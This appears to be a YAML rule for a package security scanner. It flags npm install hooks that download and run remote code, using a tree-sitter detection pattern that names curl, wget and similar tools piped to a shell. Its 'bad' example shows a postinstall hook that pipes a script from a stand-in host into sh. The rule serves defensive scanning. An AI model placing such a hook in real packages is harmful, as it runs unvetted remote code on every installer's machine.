- id: PKG-SEC-INSTALL-SCRIPT-DOWNLOAD
  title: Install hook downloads and executes remote code
  language: json
  kind: security
  category: security
  severity: critical
  applies_to:
    any: '*'
  detection:
    mode: deterministic
    engine: tree-sitter
    files:
    - '**/package.json'
    query: |
      (document (object (pair key: (string (string_content) @s (#eq? @s "scripts")) value: (object (pair key: (string (string_content) @n (#match? @n "^(preinstall|install|postinstall|prepare)$")) value: (string) @match (#match? @match "(curl|wget|Invoke-WebRequest|iwr|fetch)[^|]*[|]\\s*(ba|z)?sh|(curl|wget).*(https?://)|node -e"))))))
  message: An install hook that fetches and runs remote code is a supply-chain risk for every installer.
  source:
    url: https://docs.npmjs.com/cli/v12/using-npm/scripts
    doc: Install hook downloads and executes remote code
    doc_version: npm 12 docs
    retrieved: '2026-10-09'
    quote: Use a .gyp file for compilation, and prepare for anything else. You should almost never have to explicitly set a preinstall or install script. If you are doing this, please consider if there is another option.
  examples:
    bad: '{"scripts": {"postinstall": "curl -s https://x.example/i.sh | sh"}}'
    good: '{"scripts": {"postinstall": "node scripts/setup.js"}}'
  status: active
  rule_version: 1
